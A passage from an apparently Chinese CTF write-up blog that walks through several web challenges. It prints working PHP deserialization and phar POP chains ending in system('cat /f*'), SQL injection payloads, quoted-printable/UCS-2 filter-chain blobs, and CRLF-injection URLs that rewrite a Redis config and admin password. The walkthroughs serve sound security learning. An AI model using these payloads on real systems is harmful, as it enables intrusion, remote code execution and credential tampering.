$this-&gt;curl($this-&gt;local.\"cheems.jpg\"); }else{ $file = $this-&gt;curl($this-&gt;local.$this-&gt;path); } }else{ $file = $this-&gt;curl($this-&gt;local.\"cheems.jpg\"); } echo '&lt;img src=\"data:jpg;base64,'.base64_encode($file).'\"/&gt;'; } public function curl($path){ $url = $path; $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_HEADER, 0); $response = curl_exec($curl); curl_close($curl); return $response; } public function __wakeup(){ $this-&gt;local = \"http://127.0.0.1/\"; } } class Backdoor{ public $a; public $b; public $superhacker = \"hacker.jpg\"; public function goodman($i,$j){ $i-&gt;$j = $this-&gt;superhacker; } public function __destruct(){ $this-&gt;goodman($this-&gt;a,$this-&gt;b); $this-&gt;a-&gt;c(); } } if(isset($_GET['source'])){ highlight_file(__FILE__); }else{ if(isset($_GET['image_path'])){ $path = $_GET['image_path']; //flag in /flag.php if(is_string($path)&amp;&amp;!preg_match(\"/http:|gopher:|glob:|php:/i\",$path)){ echo '&lt;img src=\"data:jpg;base64,'.base64_encode(file_get_contents($path)).'\"/&gt;'; }else{ echo '&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src=\"data:jpg;base64,'.base64_encode(file_get_contents(\"cheems.jpg\")).'\"/&gt;'; } }else if(isset($_GET['path_info'])){ $path_info = $_GET['path_info']; $FV = unserialize(base64_decode($path_info)); $FV-&gt;loadfile(); }else{ $path = \"vergil.jpg\"; echo '&lt;h2&gt;POWER!!&lt;/h2&gt; &lt;img src=\"data:jpg;base64,'.base64_encode(file_get_contents($path)).'\"/&gt;'; } } ?&gt; 我们先看一下flag.php里面有什么，给image_path传参即可。如下所示，说flag在65500端口处 &lt;?php $a = \"good job,but there is no flag i put my flag in intranet(127.0.0.1:65500) outsider have no permissions to get it if you want it,then you have to take it but you already knew the rules try it\"; ?&gt; 接下来就是找链子，不难找到Backdoor.__destruct-》FileViewer.__call-》FileViewer.loadfile-》FileViewer::curl() 链子虽然不难找，但是我却又陷入了误区，不会做，首先先看下面的点（别的师傅强调的） 当我们的反序列化正在执行的时候，会同时执行 $FV-&gt;loadfile();这个语句，但是$FV是Backdoor的对象，根本没有这个方法，所以会报错。那么就要让$FV是FileViewer的对象。 按照我们设想，本来是想backdoor包含fileviewer类的，但是按照上述的tip，必须fileviwer类包含backdoor才行。 然后问了GPT发现反序列化顺序是先反序列化外部类，后反序列化内部类。这样的话就说通了：先上链子 &lt;?php class FileViewer{ public $black_list; public $local; public $path = \"flag\"; } class Backdoor{ public $a; public $b; public $superhacker; public function __construct(){ $this-&gt;a = new FileViewer(); $this-&gt;b = \"local\"; $this-&gt;superhacker = \"http://127.0.0.1:65500/\"; } } $a = new Backdoor(); $b = new FileViewer(); $b-&gt;local = $a; echo base64_encode(serialize($b)); 首先外部类为FileViewer，因此反序列化的时候会首先调用FileViewer类中的wakeup方法，导致local参数内容被修改。但我们注意到backdoor类中的goodman可以修改类的属性，那就可以将backdoor类中的a参数赋值为FileViewer，b赋值为local，$superhacker赋值为http://127.0.0.1:65500/，这样经过goodman的话就是： FileViewer-&gt;local = http://127.0.0.1:65500，达到效果。而这里我们需要让backdoor类被包含，那看了看参数只有local可以使用，我们令local为backdoor类对象，这样的话，反序列化先调用wakeup修改了local内容，但在脚本执行结束的时候，会自动调用析构函数来进行处理（GC回收机制）这样的话，我们又会重新调用FileViewer类对象中的call魔术方法，接着调用loadfile-》curl方法，导致最终的flag回显。 参考文章 2022 SWPU NSS 新生赛 Web Writeup [SWPUCTF 2022 新生赛]Power! [SWPUCTF 2023 秋季新生赛]查查need 这道题也是被我惯性思维导致做不出来吧，这里题目提示说是尝试万能密码。那我们就需要找注入点，这里找了半天也没有效果。看了wp发现是思路太死板吧，我只进行了单引号的尝试，没想到这里是当输入双引号之后会产生报错。导致我错过了注入点。 万能密码 首先是一个成绩查询系统，这里根据马后炮我们在post传参出都添加双引号进行尝试，就会发现，当学号处输入双引号就会引发报错 很明显这里就是注入点了，结合万能密码的提示，那大概率就是这样构造：222\" or \"1\"=\"1\"%23这样就能永真了，而这里的姓名我们需要是正确的才行，很幸运，姓名这里右上角给了我们了，只需要写个脚本提取一下（为了不乱码我提取的时候url编码了） import openpyxl from urllib.parse import quote def extract_student_names(file_path, output_file): workbook = openpyxl.load_workbook(file_path) sheet = workbook.active with open(output_file, 'w', encoding='utf-8') as f: for row in sheet.iter_rows(values_only=True): student_name = row[0] # 假设学生姓名在第一列 if student_name: student_name = quote(student_name) f.write(student_name + ' ') print('学生姓名提取完成！') # 调用示例 xlsx_file = '文件地址' # 替换为您的文件路径 output_txt = 'student_names.txt' # 替换为输出文件的路径 extract_student_names(xlsx_file, output_txt) 效果如下： 接着bp抓包进行爆破，而想到爆破的原因在于这下图，可以看到显示出来的是成绩，而不是什么敏感信息，这里我也是猜测，如果都爆破一遍，一定有一个学生的结果会不一样。结果也告诉我，我的思路是正确的 爆破完之后查看长度，发现有flag泄露。但事后看了wp发现还可以用常规的联合注入得到，并且其中的姿势我也是第一次见到（当然也可以采用报错注入）这里就学习一下联合注入了 联合注入 首先常规联合注入发现存在5列数据，接下来的联合注入就出问题了 name=1&amp;password=1&amp;student_id=1\" union select 1,2,3,4,5--+ 可以看到页面并没有显示出回显位，这里我也没见过这种情况，看了师傅解释是这样的 问题来了，当我按正常联合注入流程测的时候发现它说查无此人或密码错误，我们输入的name是1，联合注入查到的数据是1，2，3，4，5 从前端显示的结果来看很显然name并不是第一个字段，不断测试，测出name字段位 当把第二个字段设为1的时候就判断正确了，说明第二个字段是name，然后回显的成绩是5，说明第五个字段是成绩 由此可以判断后端的处理逻辑 （mysql查完数据后取查到数据的name字段值和用户输入的name值进行判断，如果name判断成功，然后回显 这里用联合注入使查到的name值为1，我们前端输入的name值也是1，两者相等，就判断成功了） 这里常规查库，当查到表名的时候又出现问题了 报错显示字符集不匹配，那就让它匹配，collate 子句将字符集转换为一致的形式，一般字符集的话都是utf8 name=1&amp;password=1&amp;student_id=1\" union select 1,1,3,4,group_concat(table_name)collate utf8_general_ci from information_schema.tables where table_schema=database()--+ 发现成功，之后就是常规思路了，不赘述了 报错注入 name=1&amp;password=1&amp;student_id=1\"and updatexml(1,concat(0x7e,(database()),0x7e),1)--+ name=1&amp;password=1&amp;student_id=1\"and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)--+ name=1&amp;password=1&amp;student_id=1\"and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='students'),0x7e),1)--+ 到了这里就会尴尬掉，因为找了所有的列都没有flag，这里看师傅如何解释的 应该是查到的数据太多了，没有全部回显出来，然后回显出来的数据中也没有flag。 出题人应该是把flag放在表的最后了，冷静，冷静，flag是很长的，因此我们只需要找到某一列最大的那个数据就可以了，这里用MAX函数获取指定列中的最大值 这样的话就可以这样构造，至于完整回显，用mid、substr都可，不再赘述 name=1&amp;password=1&amp;student_id=1\"and updatexml(1,concat(0x7e,(select MAX(grade)from students),0x7e),1)--+ [GFCTF 2021]文件查看器 给出一个登录页面，直接尝试弱密码admin:admin登录成功，之后是一个文件查看器。我们直接查看相关文件，审计代码 index.php &lt;?php function __autoload($className) { include(\"class/\".$className.\".class.php\"); } if(!isset($_GET['c'])){ header(\"location:./?c=User&amp;m=login\"); }else{ $c=$_GET['c']; $class=new $c(); if(isset($_GET['m'])){ $m=$_GET['m']; $class-&gt;$m(); } } 弄了半天，扫了目录发现源码都在www.zip上。。。 Myerror.class.php &lt;?php class Myerror{ public $message; public function __construct(){ ini_set('error_log','/var/www/html/log/error.txt'); ini_set('log_errors',1); } public function __tostring(){ $test=$this-&gt;message-&gt;{$this-&gt;test}; return \"test\"; } } User.class.php &lt;?php error_reporting(0); class User{ public $username; public $password; public function login(){ include(\"view/login.html\"); if(isset($_POST['username'])&amp;&amp;isset($_POST['password'])){ $this-&gt;username=$_POST['username']; $this-&gt;password=$_POST['password']; if($this-&gt;check()){ header(\"location:./?c=Files&amp;m=read\"); } } } public function check(){ if($this-&gt;username===\"admin\" &amp;&amp; $this-&gt;password===\"admin\"){ return true; }else{ echo \"{$this-&gt;username}的密码不正确或不存在该用户\"; return false; } } public function __destruct(){ (@$this-&gt;password)(); } public function __call($name,$arg){ ($name)(); } } Files.class.php &lt;?php class Files{ public $filename; public function __construct(){ $this-&gt;log(); } public function read(){ include(\"view/file.html\"); if(isset($_POST['file'])){ $this-&gt;filename=$_POST['file']; }else{ die(\"请输入文件名\"); } $contents=$this-&gt;getFile(); echo '&lt;br&gt;&lt;textarea class=\"file_content\" type=\"text\" value='.\"&lt;br&gt;\".$contents; } public function filter(){ if(preg_match('/^\\/|phar|flag|data|zip|utf16|utf-16|\\.\\.\\//i',$this-&gt;filename)){ echo \"这合理吗\"; throw new Error(\"这不合理\"); } } public function getFile(){ $contents=file_get_contents($this-&gt;filename); $this-&gt;filter(); if(isset($_POST['write'])){ file_put_contents($this-&gt;filename,$contents); } if(!empty($contents)){ return $contents; }else{ die(\"该文件不存在或者内容为空\"); } } public function log(){ $log=new Myerror(); } public function __get($key){ ($key)($this-&gt;arg); } } 除了File这个类文件，上述几个就是来处理错误和用户登录的 UserClass.__destruct-》UserClass.check-》MyerrorClass.__toString-》FilesClass.__get 这里我先直接写出最终的链子 &lt;?php class Myerror{ public $message; public $test; } class User{ public $username; public $password; } class Files { public $filename; public function __get($key){ ($key)($this-&gt;arg); } } $pop = new User(); $pop1 = new User(); $pop-&gt;password = [$pop1, 'check']; $pop-&gt;username = new Myerror(); $pop-&gt;username-&gt;message = new Files(); $pop-&gt;username-&gt;test = 'system'; $pop-&gt;username-&gt;message-&gt;arg = 'ls /'; echo serialize($pop); ?&gt; 不过这个链子在调用check方法的时候会遇到点问题： 在PHP中，当你在类的 __destruct 魔术方法中使用 check() 的方式进行调用时，它与 $this-&gt;check() 的调用方式并不相同。 check() 的方式是以函数的方式进行调用，而不是作为类的方法进行调用。这意味着它将被视为全局函数，而不是类的方法。这种方式可能会导致错误，因为在 __destruct 方法中无法直接调用全局函数。 如果你想在 __destruct 方法中调用类的方法，正确的方式是使用 $this-&gt;check()。这将确保在类的上下文中调用 check() 方法。 也就是说下面这个代码，如果我们直接将password赋值为check的话，就是这样的：check()，而这种调用方式与$this-&gt;check()是不相同的。那我们想要调用check函数，这里就需要利用PHP某个特性了 public function __destruct(){ (@$this-&gt;password)(); } 解决办法就是利用PHP7引入的一个新特性 Uniform Variable Syntax,它扩展了可调用数组的功能,增加了其在变量上调用函数的能力，使得可以在一个变量（或表达式）后面加上括号直接调用函数。 可调用数组的构造我们简单测试下 &lt;?php highlight_file(__FILE__); class A{ public function check(){ echo \"&lt;br&gt;check!!!\"; } } $a=[new A(),\"check\"]; $a(); 后面基本就不会了，都是没见过的知识，首先这里我们先理一下思路，这里我们链子准备好了，就是要找反序列化的点，很明显没有unserialize，但是有file_get_contents，同时还有查看文件的功能。那很容易联想到phar反序列化，那我们看看假设我们可以上传链子了，会遇到什么问题 那我们上传了链子，肯定需要phar伪协议去读取相应的文件，但我们需要看一下代码执行逻辑，这里上传之后会调用到getFile函数，该函数含有filter会将我们的phar等关键字过滤掉，闹我们就得想办法绕过。 同时注意到filter的过滤函数是在file_get_contents反序列化入口点的后面，这充分暗示我们可以绕过，同时注意到User类中含有析构函数，这里就可以联想到PHP的GC垃圾回收机制，如果我们可以提前调用到析构函数，那就会完全按照我们理想的链子路线走下去，就不会被filter所过滤掉。至于如何提前调用已经学过很多次了，就不赘述了，放几篇好的文章参考即可。 O:4:\"User\":2:{s:8:\"username\";O:7:\"Myerror\":2:{s:7:\"message\";O:5:\"Files\":2:{s:8:\"filename\";N;s:3:\"arg\";s:4:\"ls /\";}s:4:\"test\";s:6:\"system\";}s:8:\"password\";a:2:{i:0;O:4:\"User\":2:{s:8:\"username\";N;s:8:\"password\";N;}i:1;s:5:\"check\";}} 我们的链子输出如下，我们可以通过修改对象指针索引来提前调用到析构函数，也就是改为下面的（i:0） O:4:\"User\":2:{s:8:\"username\";O:7:\"Myerror\":2:{s:7:\"message\";O:5:\"Files\":2:{s:8:\"filename\";N;s:3:\"arg\";s:4:\"ls /\";}s:4:\"test\";s:6:\"system\";}s:8:\"password\";a:2:{i:0;O:4:\"User\":2:{s:8:\"username\";N;s:8:\"password\";N;}i:0;s:5:\"check\";}} 但是我们生成的phar文件，因此在经过010修改后还需要重新计算签名，完整pop如下 &lt;?php class Myerror{ public $message; public $test; } class User{ public $username; public $password; } class Files { public $filename; public function __get($key){ ($key)($this-&gt;arg); } } $pop = new User(); $pop1 = new User(); $pop-&gt;password = [$pop1, 'check']; $pop-&gt;username = new Myerror(); $pop-&gt;username-&gt;message = new Files(); $pop-&gt;username-&gt;test = 'system'; $pop-&gt;username-&gt;message-&gt;arg = 'cat /f*'; echo serialize($pop); $phar = new Phar(\"exp.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER();?&gt;'); //设置stub $phar-&gt;setMetadata($pop); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; import urllib.parse from hashlib import sha1 with open('D:\\\\PphProject\\\\Scripts\\\\exp.phar', 'rb') as file: f = file.read() s = f[:-28] # 获取要签名的数据 h = f[-8:] # 获取签名类型和GBMB标识 newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB) with open('newtest.phar', 'wb') as file: file.write(newf) # 写入新文件 然后就是如何利用伪协议和过滤器读取，因为phar文件含有特殊字符，直接将二进制复制上去根本识别不了，因此会想到用base64编码复制上去。但当我们简单测试一下会发现，如果先发送base64编码内容，接着利用PHP伪协议对内容进行解码会发现这样的报错 至于为何我们是要读取error.txt，完全就是因为当我们输入一些不符合代码的内容，该内容就会被传入error.txt（测试一下就知道了） 上述的报错是因为读取的是整个error.txt文件，其中包括了其他非编码信息,而Base64会将所有数字，字母/+=都认为是需要解码的，而那些其他垃圾数据没有经过base64编码，直接解码肯定会报错。因此靠这个思路，我们会想到怎样才能将除了我们payload之外的内容都搞成乱码（base64识别不了的）这样解码的时候，就会只解码我们的payload而不会报错。 这里就需要新知识了 utf-16le编码 当utf-8转换为utf-16le时，每一位字符后面都会加上一个\\0，这个\\0是不可见的，当将utf-16le转换为utf-8的时候，只有后面有\\0的才会被正常转换，否则变为乱码 那么我们是否可以利用utf-16le来标记我们的payload，然后解码只对我们payload解码(其他变成乱码)，然后再base64解码。不过这个被过滤了，我们可以用UCS-2编码（区别在于\\0在前面） UCS-2编码 UCS-2 编码使用固定2个字节,所以在ASCII字符中,在每个字符前面会填充一个 00字节(大端序) lanb0 =&gt; \\x00l\\x00a\\x00n\\x00b\\x000 那么下一步就是如何构造\\0，因为是不可见字符，所以引入Quoted-Printable编码 “Quoted-Printable\"编码的基本原则是：安全的ASCII字符（如字母、数字、标点符号等）保持不变，空格也保持不变（但行尾的空格必须编码），其他所有字符（如非ASCII字符或控制字符）则以”=\"后跟两个十六进制数字的形式编码 lanb0 =&gt; lanb0=0A 这样的话，整个流程如下： 测试数据：test base64编码：dGVzdA== 加上\\0（等号也要转换）：=00d=00G=00V=00z=00d=00A=00=3D=00=3D 上传后： 垃圾数据=00d=00G=00V=00z=00d=00A=00=3D=00=3D垃圾数据 解码： 垃圾数据\\0d \\0G \\0V \\0z \\0d \\0A \\0= \\0=垃圾数据 UCS-2转UTF-8：乱码dGVzdA==乱码 base64解码：test 加密脚本 &lt;?php $a=file_get_contents('newtest.phar');//获取二进制数据 $a=iconv('utf-8','UCS-2',base64_encode($a));//UCS-2编码 file_put_contents('hacker.txt',quoted_printable_encode($a));//quoted_printable编码 file_put_contents('hacker.txt',preg_replace('/=\\r /','',file_get_contents('hacker.txt')).'=00=3D');//解决软换行导致的编码结构破坏 ?&gt; 注：在 Quoted-Printable 编码中，为了防止编码后的字符串过长，通常会在每76个字符后插入一个软换行，也就是 = 符号加上一个换行符。 =00P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00o=00v=00A=00Q=00A=00A=00A=00Q=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00D=005=00A=00A=00A=00A=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00T=00z=00o=000=00O=00i=00J=00V=00c=002=00V=00y=00I=00j=00o=00y=00O=00n=00t=00z=00O=00j=00g=006=00I=00n=00V=00z=00Z=00X=00J=00u=00Y=00W=001=00l=00I=00j=00t=00P=00O=00j=00c=006=00I=00k=001=005=00Z=00X=00J=00y=00b=003=00I=00i=00O=00j=00I=006=00e=003=00M=006=00N=00z=00o=00i=00b=00W=00V=00z=00c=002=00F=00n=00Z=00S=00I=007=00T=00z=00o=001=00O=00i=00J=00G=00a=00W=00x=00l=00c=00y=00I=006=00M=00j=00p=007=00c=00z=00o=004=00O=00i=00J=00m=00a=00W=00x=00l=00b=00m=00F=00t=00Z=00S=00I=007=00T=00j=00t=00z=00O=00j=00M=006=00I=00m=00F=00y=00Z=00y=00I=007=00c=00z=00o=003=00O=00i=00J=00j=00Y=00X=00Q=00g=00L=002=00Y=00q=00I=00j=00t=009=00c=00z=00o=000=00O=00i=00J=000=00Z=00X=00N=000=00I=00j=00t=00z=00O=00j=00Y=006=00I=00n=00N=005=00c=003=00R=00l=00b=00S=00I=007=00f=00X=00M=006=00O=00D=00o=00i=00c=00G=00F=00z=00c=003=00d=00v=00c=00m=00Q=00i=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=000=008=006=00N=00D=00o=00i=00V=00X=00N=00l=00c=00i=00I=006=00M=00j=00p=007=00c=00z=00o=004=00O=00i=00J=001=00c=002=00V=00y=00b=00m=00F=00t=00Z=00S=00I=007=00T=00j=00t=00z=00O=00j=00g=006=00I=00n=00B=00h=00c=003=00N=003=00b=003=00J=00k=00I=00j=00t=00O=00O=003=001=00p=00O=00j=00E=007=00c=00z=00o=001=00O=00i=00J=00j=00a=00G=00V=00j=00a=00y=00I=007=00f=00X=001=00p=00O=00j=00A=007=00T=00j=00t=009=00C=00A=00A=00A=00A=00H=00R=00l=00c=003=00Q=00u=00d=00H=00h=000=00B=00A=00A=00A=00A=00N=00X=008=008=00m=00U=00E=00A=00A=00A=00A=00D=00H=005=00/=002=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00d=00G=00V=00z=00d=00G=00b=00k=003=00N=00T=00L=00f=00N=00E=00j=00w=001=00p=00Y=00r=00c=00c=002=00z=00T=00L=00Y=00E=00x=00V=00b=00A=00g=00A=00A=00A=00E=00d=00C=00T=00U=00I=00=3D=00=3D 之后直接复制进去访问log/error.txt，接下来就要用到伪协议和过滤器（后面步骤要点击重写文件） php://filter/read=consumed/resource=log/error.txt //可以先用这个删除error.txt文件内容，防止文件内容过多造成后续base64解码报错 解码quoted-printable php://filter/read=convert.quoted-printable-decode/resource=log/error.txt 解码UCS-2 php://filter/read=convert.iconv.UCS-2.UTF-8/resource=log/error.txt php://filter/write=convert.base64-decode/resource=log/error.txt phar://log/error.txt 这里不知道为什么，到了最后一步总是报错，phar似乎不能绕过，我采用wp的答案也不行，感觉是环境寄了。。。 第二天又看了看，经过文章的仔细比对发现payload不一样，如下图所示，除了第二个，其他都是正确的。 这里我也不知道为何，链子跟师傅们感觉一样，但就是出不来，之后换用师傅们的链子出来过一次，但我自己原来的写法也是一致的感觉，很奇怪 这里放个最终的payload得了，感觉是环境问题 =00R=000=00l=00G=00O=00D=00l=00h=00P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00q=00N=00A=00Q=00A=00A=00A=00Q=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00B=00X=00A=00Q=00A=00A=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00T=00z=00o=000=00O=00i=00J=00V=00c=002=00V=00y=00I=00j=00o=00y=00O=00n=00t=00z=00O=00j=00g=006=00I=00n=00V=00z=00Z=00X=00J=00u=00Y=00W=001=00l=00I=00j=00t=00P=00O=00j=00c=006=00I=00k=001=005=00Z=00X=00J=00y=00b=003=00I=00i=00O=00j=00I=006=00e=003=00M=006=00N=00z=00o=00i=00b=00W=00V=00z=00c=002=00F=00n=00Z=00S=00I=007=00T=00z=00o=001=00O=00i=00J=00G=00a=00W=00x=00l=00c=00y=00I=006=00M=00j=00p=007=00c=00z=00o=004=00O=00i=00J=00m=00a=00W=00x=00l=00b=00m=00F=00t=00Z=00S=00I=007=00T=00j=00t=00z=00O=00j=00M=006=00I=00m=00F=00y=00Z=00y=00I=007=00c=00z=00o=003=00O=00i=00J=00j=00Y=00X=00Q=00g=00L=002=00Y=00q=00I=00j=00t=009=00c=00z=00o=000=00O=00i=00J=000=00Z=00X=00N=000=00I=00j=00t=00z=00O=00j=00Y=006=00I=00n=00N=005=00c=003=00R=00l=00b=00S=00I=007=00f=00X=00M=006=00O=00D=00o=00i=00c=00G=00F=00z=00c=003=00d=00v=00c=00m=00Q=00i=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=000=008=006=00N=00D=00o=00i=00V=00X=00N=00l=00c=00i=00I=006=00M=00T=00p=007=00c=00z=00o=004=00O=00i=00J=001=00c=002=00V=00y=00b=00m=00F=00t=00Z=00S=00I=007=00T=00z=00o=003=00O=00i=00J=00N=00e=00W=00V=00y=00c=00m=009=00y=00I=00j=00o=00y=00O=00n=00t=00z=00O=00j=00c=006=00I=00m=001=00l=00c=003=00N=00h=00Z=002=00U=00i=00O=000=008=006=00N=00T=00o=00i=00R=00m=00l=00s=00Z=00X=00M=00i=00O=00j=00I=006=00e=003=00M=006=00O=00D=00o=00i=00Z=00m=00l=00s=00Z=00W=005=00h=00b=00W=00U=00i=00O=000=004=007=00c=00z=00o=00z=00O=00i=00J=00h=00c=00m=00c=00i=00O=003=00M=006=00N=00z=00o=00i=00Y=002=00F=000=00I=00C=009=00m=00K=00i=00I=007=00f=00X=00M=006=00N=00D=00o=00i=00d=00G=00V=00z=00d=00C=00I=007=00c=00z=00o=002=00O=00i=00J=00z=00e=00X=00N=000=00Z=00W=000=00i=00O=003=001=009=00a=00T=00o=00x=00O=003=00M=006=00N=00T=00o=00i=00Y=002=00h=00l=00Y=002=00s=00i=00O=003=001=009=00a=00T=00o=00w=00O=000=004=007=00f=00Q=00g=00A=00A=00A=00B=000=00Z=00X=00N=000=00L=00n=00R=004=00d=00A=00s=00A=00A=00A=00C=00L=001=006=00R=00h=00C=00w=00A=00A=00A=00N=00v=00G=00o=00S=00C=002=00A=00Q=00A=00A=00A=00A=00A=00A=00A=00G=00F=00h=00Y=00W=00F=00h=00Y=00W=00F=000=00Z=00X=00N=000=006=00O=00q=00P=00c=004=00H=00F=00K=009=00m=00B=003=00b=00p=00Q=00s=00r=005=00Y=00g=00y=004=00x=00o=00L=00Y=00C=00A=00A=00A=00A=00R=000=00J=00N=00Q=00g=00=3D=00=3D 参考文章 [GFCTF2021]文件查看器复现 [GFCTF 2021]文件查看器 GFCTF 2021]文件查看器 [SWPU 2016]web7 #!/usr/bin/python # coding:utf8 __author__ = 'niexinming' import cherrypy import urllib2 import redis class web7: @cherrypy.expose def index(self): return \"&lt;script&gt; window.location.href='/input';&lt;/script&gt;\" @cherrypy.expose def input(self,url=\"\",submit=\"\"): file=open(\"index.html\",\"r\").read() reheaders=\"\" if cherrypy.request.method==\"GET\": reheaders=\"\" else: url=cherrypy.request.params[\"url\"] submit=cherrypy.request.params[\"submit\"] try: for x in urllib2.urlopen(url).info().headers: reheaders=reheaders+x+\"&lt;br&gt;\" except Exception,e: reheaders=\"错误\"+str(e) for x in urllib2.urlopen(url).info().headers: reheaders=reheaders+x+\"&lt;br&gt;\" file=file.replace(\"&lt;?response?&gt;\",reheaders) return file @cherrypy.expose def login(self,password=\"\",submit=\"\"): pool = redis.ConnectionPool(host='127.0.0.1', port=6379) r = redis.Redis(connection_pool=pool) re=\"\" file=open(\"login.html\",\"r\").read() if cherrypy.request.method==\"GET\": re=\"\" else: password=cherrypy.request.params[\"password\"] submit=cherrypy.request.params[\"submit\"] if r.get(\"admin\")==password: re=open(\"flag\",'r').readline() else: re=\"Can't find admin:\"+password+\",fast fast fast.....\" file=file.replace(\"&lt;?response?&gt;\",re) return file cherrypy.config.update({'server.socket_host': '0.0.0.0', 'server.socket_port': 8080, }) cherrypy.quickstart(web7(),'/') 代码逻辑也不难理解，首先是对input页面的处理他会提取到输入框中的url参数内容，接着调用urllib2模块打开url，获取响应的头部信息，并返回页面中。 其次是对login页面的处理，他获取输入框中的password参数内容，接着连接redis数据库，将该数据库中admin键所对应的值与password内容比较，如果相等，则回显flag。 也就是说，我们需要想办法获取到redis中admin的值。这里我当时还以为用ssrf常规打redis的思路，直接gopher协议干，但试下来没啥效果，似乎只能以http来开头。随后看了wp发现不在自己知识存储范围内： 这道题对我来说依旧是新知识：python的urllib2的http头部注入 我们以redis数据库为例，当存在SSRF时我们伪造以下请求 http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0a:6379/foo 解码一下，执行过程就是将修改Redis的工作目录为 /tmp，然后修改Redis的数据库文件名为 evil，路径为默认端口的/foo http://127.0.0.1 CONFIG SET dir /tmp CONFIG SET dbfilename evil :6379/foo 然后就可以执行相关操作，比如修改用户的密码。再次利用ssrf漏洞进行修改并保存 http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/foo 解码结果如下 http://127.0.0.1 set admin admin save :6379/foo 有了上面的知识，我们直接修改redis数据库的密码就行了 http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/foo //这里建议一直点击发送，然后发送完，赶紧输入admin密码登录 具体漏洞原理，我认为可参考：CRLF injection urllib2 HTTP头部注入 [SWPU 2016]web400 这道题我是在找不到源码泄露的地方。。。只能看wp，cp一下了 //common.php foreach(Array(\"_POST\",\"_GET\",\"_COOKIE\") as $key){ foreach($$key as $k =&gt; $v){ if(is_array($v)){ die(\"hello,hacker!\"); } else{ $k[0] !='_'?$$k = addslashes($v):$$k = \"\"; } } } 这里看到$$配合foreach可以想到变量覆盖，这里test一下看看覆盖逻辑 &lt;?php foreach(Array(\"_POST\",\"_GET\",\"_COOKIE\") as $key){ foreach($$key as $k =&gt; $v){ if(is_array($v)){ die(\"hello,hacker!\"); } else{ echo $k[0].\" \"; $k[0] !='_'?$$k = addslashes($v):$$k = \"\"; } } } $a=1; echo $a; echo \" \"; echo $b; 当我们输入以上代码的时候，我们get传参一下，如下图 可以看到已经初始化的a变量没有被覆盖，而b未初始化，但被覆盖（但光靠想我想不出来为何a没有被覆盖） //riji.php require_once(\"common.php\"); session_start(); if (@$_SESSION['login'] !== 1) //检测登陆，没登陆就没有然后了 { header('Location:/web/index.php'); exit(); } if($_SESSION['user']) { $username = $_SESSION['user']; @mysql_conn(); $sql = \"select * from user where name='$username'\"; $result = @mysql_fetch_array(mysql_query($sql)); //查询用户 mysql_close(); if($result['userid']) //用户不存在就不会执行下面的语句，id就不会初始化了 { $id = intval($result['userid']); } } else { exit(); } ?&gt; //中间省略部分html代码，下面是id关键代码 &lt;?php @mysql_conn(); $sql1 = \"select * from msg where userid= $id order by id\"; //id参数没有过滤 $query = mysql_query($sql1); //直接sql注入 $result1 = array(); while($temp=mysql_fetch_assoc($query)) { $result1[]=$temp; } mysql_close(); foreach($result1 as $x=&gt;$o) { echo display($o['msg']); } ?&gt; 上述代码会获取当前登录的用户名，然后进入数据库查询该用户的userid，并将其转换为整数 接着将得到的userid传入数据库在进行查询（但这个userid没有被过滤），获取到相应的结果。很明显这里的userid是不可控的，因为userid本身就在数据库中（已经被初始化），我们继续看代码，看是否能搞一些东西来控制他 在 api.php 中有 del_user 函数，可以删除用户，但是需要 userid 的值 //api.php function del_user(){ if($this-&gt;userid){ //需要userid信息才行 $user_id = intval($this-&gt;userid);//防注入 if($user_id == 1){ echo('&lt;script&gt;alert(\"Admin can\\'t delete!!\")&lt;/script&gt;'); exit(); } @mysql_conn(); $sql2 = \"DELETE FROM user where userid='$user_id'\"; if(mysql_query($sql2)){ echo('&lt;script&gt;alert(\"Delete user success!!\")&lt;/script&gt;'); exit(); } else{ echo('&lt;script&gt;alert(\"Delete user wrong!!\")&lt;/script&gt;'); exit(); } mysql_close(); } else{ echo('&lt;script&gt;alert(\"Check Your user_id!!\")&lt;/script&gt;'); exit(); } } 可以看到这里的del_user是一个删除用户的功能函数，先判断userid是否存在，然后转为整数，如果等于1，显示不能删除admin用户，如果不是1的话，我们就可以实现除admin之外任意用户的删除了 在 index.php 中可以找到 cookie 的拼接方法，cookie 里面就有 userid，base64 解一下就可以了 if(@$login==1) { @mysql_conn(); $sql = \"select * from user where name='$username'\"; $result = @mysql_fetch_array(mysql_query($sql)); mysql_close(); if (!empty($result)) { if($result['passwd'] == md5($password)) { $user_cookie = ''; $user_cookie .= $result['userid']; //user_cookie拼接方法，userid+name+salt $user_cookie .= $result['name']; $user_cookie .= $result['salt']; $cookies = base64_encode($user_cookie); //拼接后base64编码就是cookie了 //$cookies = $user_cookie; setcookie(\"user\",$cookies,time()+60,'/web/'); $_SESSION['login'] = 1; $_SESSION['user'] 